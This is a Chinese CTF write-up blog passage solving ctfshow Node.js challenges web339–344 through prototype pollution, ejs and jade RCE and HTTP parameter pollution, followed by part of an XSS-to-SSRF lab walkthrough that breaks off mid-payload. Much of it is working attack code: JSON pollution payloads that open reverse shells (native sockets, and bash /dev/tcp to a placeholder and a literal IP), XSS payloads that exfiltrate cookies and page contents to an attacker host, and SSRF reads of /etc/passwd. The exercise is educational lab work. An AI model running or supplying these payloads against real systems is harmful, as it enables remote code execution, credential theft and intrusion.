JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; 为什么 query 的值是 2233 呢？也就是为啥会被调用了呢？ 首先看看 query 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 中所有的对象的原型都可以继承到 Object，然后终点是 null 对象 如 web338 中所说的，当在当前上下文找不到相应对象时，会遍历 Object 对象是否存在相应的属性。 到这里就很清楚的知道了，为什么 query 的值是 &quot;return 2233&quot; ，因为在调用 copy 时，原型链被污染了。 至于 &#123; query: Function(query)(query)&#125; 为何为 &#123; query: 2233 &#125; JS 的函数实际上都是一个 Function 对象，它的参数为 1new Function ([arg1[, arg2[, ...argN]],] functionBody) 写个小demo 即 Function 对象传入构造函数里的前面参数是函数的形参，当然可以省略，最后的形参写函数体。 其实作用和 eval 有点类似，详细可以看 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function 至此，利用思路明确了，只要污染了 query 对象，就可以执行任意我们想执行的代码，比如反弹个 shell 再获取 flag ~ 然后污染点和 web338 一致，在 login.js 里的 utils.copy(user,req.body); ，代码执行的触发点在 api.js 的 res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;); 处。 payload ，这里用 nodejs 原生 socket，防止因系统运行环境问题 shell 弹不回来，这里服务器的监听端口为 2233 ，然后如何是 windows 系统就把 /bin/sh 换成 cmd.exe 应该就可以了。 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; 先本地试试，这里服务器监听端口为 2233 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\\&#x27;net\\&#x27;),cp = require(\\&#x27;child_process\\&#x27;),sh = cp.spawn(\\&#x27;/bin/sh\\&#x27;, []);var client = new net.Socket();client.connect(2233, \\&#x27;服务器IP\\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; ok，没啥大问题。 先 POST 一下 login 接口，污染 query 对象 然后直接 POST 一下 api 接口即可。 emm，发现不行，之后访问 /login 和 /api 接口都是 404 找不到文件 ，shell 也反弹不回来。 试试别人的 1&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125; flag 仔细对比了一下，发现了，感觉是命名空间问题，即 require 可能不被识别，尝试把 require 改为 global.process.mainModule.constructor._load ，同样服务器监听端口为 2233 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; 也是先 POST /login 接口污染 query 对象 访问下 /api 接口 反弹 shell 并获取 flag 然后顺便翻了个链接，好像确实如此~ https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js 因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 require 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 require 进行编译。 还有一个其他解，见 web338 中的 ejs RCE，一样的EXP、步骤和利用方式 web340 原型连污染 ++nodejs/v10.19.0 题目描述处蓝奏云下载源码 📎web340.zip 提取关键部分 123456789101112var flag=&#x27;flag_here&#x27;;var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;;&#125;utils.copy(user.userinfo,req.body);if(user.userinfo.isAdmin)&#123; res.end(flag);&#125; 发现 userinfo 的原型不是 Object 对象， userinfo.__proto__.__proto__ 才是 Object 对象。 和 web339 一样，只不过要套两层才能污染 Object 对象，同样用原生 socket，服务端监听端口为 2233 （ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; 同样 POST 一下 /login 接口污染 query 对象 POST 一下 /api 接口触发 获取 flag web341 原型链污染 +++题目描述处蓝奏云下载源码 📎web341.zip 这题和其他不同的是没有 /api 接口触发污染点了，所以使用 web338 中的 ejs RCE。 然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 2233 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;&#125;&#125;&#125; 注意这里的前面的 _tmp1; 和后面的 var __tmp2 不能删，web338 evil0 的分析有体现到，是为了闭合代码。 同样 POST 一下 /login 接口污染数据 然后请求一个会调用 render 方法的接口 即可获得 flag web342 原型链污染 ++++题目描述处蓝奏云下载源码 📎web342.zip 然后还有个提示 审计了1个小时发现的，此链目前网上未公开，难度稍大 本题就不是用 ejs 进行模板渲染了，而是使用了 jade 一开始想看其他师傅的文章 https://xz.aliyun.com/t/7025 emm，但是发现说的每个字都认识，连起来就觉得有点莫名其妙了。。于是想着先自己手动分析一下，熟悉一波，方便自己和师傅在同一个频道上，防止师傅说的每句话都感觉莫名其妙… 详细的断点分析参考 https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade 这里用 VS Code 来 debug 分析 就会自动创建这样一个文件 1234567891011121314151617&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;pwa-node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Launch Program&quot;, &quot;skipFiles&quot;: [ &quot;&lt;node_internals&gt;/**&quot; ], &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/bin/www&quot; &#125; ]&#125; 然后下个断点，运行一下，访问网页就可以开始愉快的 debug 了 这里直接用 ctfshow web342 的代码进行 依次进入 res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine 入口是 rederFile 方法，注意 renderFile 函数返回值可执行 进入 handleTemplateCache 进入 compile 函数 205行 有个 parse 解析，可以看到结果返回到 parsed，又传递给了 fn，先不管 parse 方法，继续向下看代码 218行 这里就比较有趣了，有个看似可控的代码执行（new Function，这个在 web339 有提到） 进入 parse 看看返回值中是否有可控部分 parse 方法内部可以看到先内部 parse 再内部 compile，内部 parse 结果最终会被拼接到外层 parse 函数返回值部分 即 114行的 js对象 被拼接到 148行 或 149行的 js对象 里，最终拼接到 body键 返回 先跟进 114行 的 compile 方法，发现本方法返回的是 buf 跟进 66行的 this.visit(this.node); 发现可控（因为 node.filename 被 utils.stringify() 了）的 node.line 可以被 push 到 buf 中，条件是 this.debug=true 然后在 212行的 this.visitNode(node); 去遍历 ast 树，遍历完后回到 compile 方法 可以看到 node.line 被记录到 fn 中，然后通过 Function 调用执行这部分代码。 也就是说如果我们可以污染 node.line 就可以运行我们代码。 也就是说 jade 本身是没有漏洞的，因为模板的渲染逻辑是如何，但问题是，如果存在可控的原型链污染，就可以帮助我们污染 node.line 。 于是尝试 POST /login 接口 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;&#125;&#125;&#125; 断点发现，， node.line 值还是 0、1、2 之类的？ 突然醒悟，，还有一个问题，我们在调试过程中发现，node.line 是存在值的，比如上图中的 0、1、2 ，如果存在值的话，它会直接获取这个值，而不是获取我们污染过的 Object 对象里的值！ 其实原型链污染的利用核心就是：访问对象的属性/值为 undefined 才行，不然我们污染 Object 对象就没有意义了。 现在看这篇文章就能看懂了，而且发现总结的非常好。。 https://xz.aliyun.com/t/7025 好的，在同一频道上了。 先梳理上面分析的函数调用栈，我们断点入口在 routes/index.js res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;); ，调用栈如下 routes/index.js :: res.render jade/lib/index.js :: exports.__express jade/lib/index.js :: exports.renderFile jade/lib/index.js :: handleTemplateCache jade/lib/index.js :: exports.compile jade/lib/index.js :: parse -&gt; compiler.compile(); jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node) jade/lib/compiler.js :: this.visit jade/lib/compiler.js :: this.buf.push jade/lib/index.js :: parse -&gt; options.self jade/lib/index.js :: fn = new Function(‘locals, jade’, fn) jade/lib/index.js :: fn(locals, Object.create(runtime)) 至 4. a. iii. 这部分调用栈用下图，4. b. c. d. 的在上面 debug 也有提及，因此调用栈这部分问题不大 问题有 3 visit 方法中 this.debug=true ，不然 this.buf.push 调用不了 在上面提到的：node.line 在某处为 undefined 才行，不然我们污染的 Object 对象就没意义 保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常 第 1 个问题容易解决，因为在 Jade 入口 exports.__express ，我们上面 deubg 分析时也看到 123456exports.__express = function (path, options, fn) &#123; if (options.compileDebug == undefined &amp;&amp; process.env.NODE_ENV === &#x27;production&#x27;) &#123; options.compileDebug = false; &#125; exports.renderFile(path, options, fn);&#125; options.compileDebug 无初始值，可以覆盖开启 Debug 模式（经分析，this.debug 获取的就是这里的 debug 值），当然也有另外一种情况，部署时，没有正确配置 req.app.get(&#39;env&#39;) 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置，2333。 这里因 utils.copy(user.userinfo,req.body); 与 web341一样，userinfo.__proto__.__proto__ 才是 Object 对象的原型，所以要套两层。 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1&#125;&#125;&#125; 先打一下 第 3 个问题提前出现了，要先解决这个问题，保证代码能够执行到渲染阶段 和先知文章里不同，这里报错有点不一样，先跟进 Compiler.visitNode 225行看一下 拼接一下，发现没有这个方法 在遍历AST树时，通常是通过 &quot;visit&quot; + 节点类型 来遍历所有节点的，观察错误调用栈也知，比如 visitBlock，就是访问 Block 节点。那 Block 可用，我们就污染一下 type 就好了，当它当前上下文找不到就去找 Object 了。 当然选取时，最好是选的节点附带的上下文信息进入后，啥事也不会做的，不然也有走向奇奇怪怪的逻辑，先来看看 Block 节点。 这里加上这部分逻辑，来看看我们故意伪造 Block 节点会发生什么 123if (node.type == undefined) &#123; return this[&#x27;visit&#x27; + &#x27;Block&#x27;](node);&#125; 这里 block.nodes 为 undefined ，然后 undefined.length 明显，这样访问会报错，导致进入其他错误，然后 jade 没有对这块异常进行处理。 也就是说，如果 vist 的节点不是这种 block.子属性.孙子属性 问题应该不大。顶多一个 undefined 然后直接结束啥的，这里试试 visitCode ， 正常走到后面，没有报错，期间只触发了 this.buf.push(code.val) ，问题应该不大。 尝试污染 type 为 Code 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;&#125;&#125;&#125; 好耶，像是解决了，因为这个报错和先知文章报错一致。 尝试解决这个报错，因为看错误调这里好像还没到渲染成功的地方。 分析这个错误栈，可以看到前 4 点还是属于 jade 范畴。先跟进 jade 模块最后报错的地方，即 jade/libindex.js 149行的 parse 方法， 发现，程序已经走完刚刚AST遍历部分了，已经差不多要返回了。 感觉只要避免进入149行的 addWith 方法，就可以渲染成功了！ 然后进入149行的 addWith 方法是满足147行的 options.self 值为 False，尝试下看看这个 options.self 默认是不是 undefined，如果是就可以污染了。 nice，就是 undefined ，尝试污染 self 为 true ，1 也可以 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1&#125;&#125;&#125; ！！！终于走到渲染这一步了！ 看到 undefined 好说，污染就完事了 （ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;&#125;&#125;&#125; 到这 index 的页面渲染就没啥问题了，到 第 2 个问题，node.line 在某处为 undefined 才行，不然我们污染的 Object 对象就没意义 这里如果一步一步动态调试会比较麻烦，直接注入测试即可 发现都 node 为 Block 的时候 line 是不存在的。 理论上，只要覆盖了 node.line 即可达到代码执行的目的。 然后拼接上面避免报错的参数，得到 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/2233&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; 反弹 Shell 再 POST一次，发送的数据包不用变 不就少了个 message，那我污染你呗，，然后 message 后又说少了 error 继续污染，然后 error 是一个对象，就需要弄个 json 格式数据啦。 emmm，到这，其实一开始就犯了个很蠢的错。。。其实一开始就应该污染 line 先的，然后在试 compileDebug、type、self，蠢哭了，，因为，如果不污染 line 先的话，不能保证在 line 正确的情况下试其他的，就会导致，，其他对了，加上 line 就错了。。 其实这里，压根就不用污染 title，如果是 先污染 line，然后到 compileDebug、type、self 会发现，到 self 这就可以成功反弹 shell 了，人都傻了。。。 最终 EXP 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; 不用变，在POST一次即可 原本想用原生Socket的，不知道为啥老是报错，奇怪，，难道闭合不了？ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; web343 原型链污染 +++++说有过滤，但 web342一样的 EXP 也可以打，反弹shell后看源码才发现确实多了点东西 login.js 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page. */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123; res.type(&#x27;html&#x27;); var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;; &#125;; if(JSON.stringify(req.body).match(/Text/ig))&#123; res.end(&#x27;hacker go away&#x27;); &#125;else&#123; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin)&#123; return res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;&#125;); &#125;else&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;); &#125; &#125;&#125;);module.exports = router; emmm 有点不懂这个 JSON.stringify(req.body).match(/Text/ig) 过滤有啥意义就是了。。 和web342一样的EXP web344 HPP代码 1234567891011121314router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag = &#x27;flag_here&#x27;; if(req.url.match(/8c|2c|\\,/ig))&#123; res.end(&#x27;where is flag :)&#x27;); &#125; var query = JSON.parse(req.query.query); if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123; res.end(flag); &#125;else&#123; res.end(&#x27;where is flag. :)&#x27;); &#125;&#125;); 即 url 中不能包含大小写 8c、2c 和 逗号 先构造一个正常请求 1/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; 发现题目会过滤掉逗号，尝试 URL 编码， urlencode(&quot;,&quot;) = %2c 发现 2c 也被过滤 HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些 https://www.cnblogs.com/AtesetEnginner/p/12375499.html nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。 因此构造 1/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125; 这里把 c进行url编码，是因为 双引号 的url编码是 %22，和 c 连接起来就是 %22c，会匹配到正则表达式。 一些参考的题解 https://blog.csdn.net/solitudi/article/details/111669500 https://blog.csdn.net/miuzzx/article/details/111780832 http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"XSS & SSRF组合拳","slug":"xssrf","date":"2021-04-26T01:58:40.000Z","updated":"2021-04-26T07:59:47.566Z","comments":true,"path":"2021/04/26/xssrf/","link":"","permalink":"https://tari.moe/2021/04/26/xssrf/","excerpt":"","text":"去年实习中就遇到一个场景，用 xss 去打 redis，想着刷刷靶场练习一下，然后就在收藏夹吃了一年的灰了。。 https://xssrf.hackme.inndy.tw/ 即下面链接的 38 - 40 题 https://hackme.inndy.tw/scoreboard 扫描一下目录，发现 robots.txt 里有三条信息 123Disallow: /config.phpDisallow: /you/cant/read/config.php/can/you?Disallow: /backup.zip 发现 backup.zip 有密码打不开 xssme随便用个帐号注册登录一下，在 Mailbox 收到管理员发来的邮件 I am admin from this website, I will read all your mails but never reply. 也就是会一直读我发的邮件，但是不会回复，也就是没有回显。 直接上 payload 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233&#x27;&quot;&gt; 这里用 svg/onload 是为了绕过空格限制 可以正常通信 获取管理员 Cookie 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cookie&quot;&gt; 奇怪，接收不到 但通过导航栏 Sent Mail 可以获取自己的。。。试试通过接收平台来接收 http://ceye.io/ 1&lt;svg/onload=&quot;document.location=&#x27;http://c6i7bf.ceye.io/&#x27;+document.cookie&quot;&gt; 只有 dns 解析记录，没有 http 请求记录。。XSS平台Cookie字段为空。。。 奇怪了，然后试试 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cooki&quot;&gt; 发现返回正常，难道，过滤了cookie关键字？或者，，Cookie里的特殊字段导致 HTTP包异常？尝试对获取到的 cookie 进行编码。 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.cookie)&quot;&gt; 为啥用 btoa 呢，因为一开始试过了 escape 不过没用… escape 后 Cookie里也没空格的样子emmm 因为题目过滤了 ) ，所以需要HTML编码一下双引号里面的。 https://www.qqxiuzi.cn/bianma/zifushiti.php 好耶！ 第一个flag 1FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#125; 并提示了第二个 flag 在 redis 里 xssrf leak尝试用 xssme 得到的 admin cookie ，尝试 XFF 也是如此。 这里先读一下 admin 页面 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.body.innerHTML)&quot;&gt; 同样引号里的东西HTML编码一下给管理员发邮件 正常收到 把这一串 base64解码一下，提取关键信息，发现主要多了 Set Admin 和 Send Request 两个功能。 1234567891011121314151617&lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt; 通过 AJAX 请求分别请求一下 setadmin.php 和 request.php 看看 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 一样HTML编码一下双引号里面的部分，同样在导航栏 Send Mail 部分发送 base64解码提取关键部分 1234567&lt;form action=&quot;/request.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;url&quot;&gt;URL&lt;/label&gt; &lt;textarea name=&quot;url&quot; class=&quot;form-control&quot; id=&quot;url&quot; aria-describedby=&quot;url&quot; placeholder=&quot;URL&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Send Request&lt;/button&gt;&lt;/form&gt; 还有 setadmin.php 同样，结果 base64解码 提取关键部分 1234567&lt;form action=&quot;/setadmin.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; aria-describedby=&quot;username&quot; placeholder=&quot;Username&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Give Admin Access&lt;/button&gt;&lt;/form&gt; 这里试试能不能通过 setadmin.php 设置管理员，之后操作也方式一点点。 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;username=tari&quot;);&quot;&gt; 得到返回信息… 1&lt;div class=&quot;alert alert-warning&quot;&gt;This user is already a admin.&lt;/div&gt; 那继续通过这种方式获取利用 request.php 吧，存在 SSRF 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///etc/passwd&quot;);&quot;&gt; 读了一下 /etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;falsesystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false_apt:x:104:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsemessagebus:x:105:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;falsemysql:x:106:108:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falseredis:x:107:110::&#x2F;var&#x2F;lib&#x2F;redis:&#x2F;bin&#x2F;false 发现 www-data 解析目录为 /var/www 并且有 redis 用户 尝试了 /proc/self/environ 和 /proc/self/cmdline 都无法获取准确的 web 根目录，只能猜了，比如 /var/www/html （ 读取一下扫描目录发现的 config.php 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); 